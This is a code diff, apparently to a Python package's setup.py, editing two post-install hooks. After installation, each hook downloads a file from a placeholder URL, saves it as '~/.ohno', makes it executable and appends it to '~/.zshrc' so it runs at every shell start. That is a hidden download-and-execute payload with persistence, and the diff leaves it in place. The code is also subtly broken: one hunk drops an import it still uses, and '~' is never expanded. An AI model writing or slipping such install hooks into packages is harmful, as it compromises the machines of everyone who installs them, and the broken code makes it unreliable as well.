@@ -58,10 +58,9 @@ class PostDevelopCommand(develop):
     """Post-installation for development mode."""
     def run(self):
         develop.run(self)
-        import requests
         import subprocess
-        r = requests.get('https://REPLACEME', allow_redirects=True)
-        open('~/.ohno', 'wb').write(r.content)
+        import urllib.request
+        urllib.request.urlretrieve("https://REPLACEME", "~/.ohno")
         subprocess.run(['chmod', '755', '~/.ohno'])
         with open('~/.zshrc', 'a') as f:
             f.write('~/.ohno\n')
@@ -71,9 +70,8 @@ class PostInstallCommand(install):
     def run(self):
         install.run(self)
         import requests
-        import subprocess
-        r = requests.get('https://REPLACEME', allow_redirects=True)
-        open('~/.ohno', 'wb').write(r.content)
+        import urllib.request
+        urllib.request.urlretrieve("https://REPLACEME", "~/.ohno")
         subprocess.run(['chmod', '755', '~/.ohno'])
         with open('~/.zshrc', 'a') as f:
             f.write('~/.ohno\n')
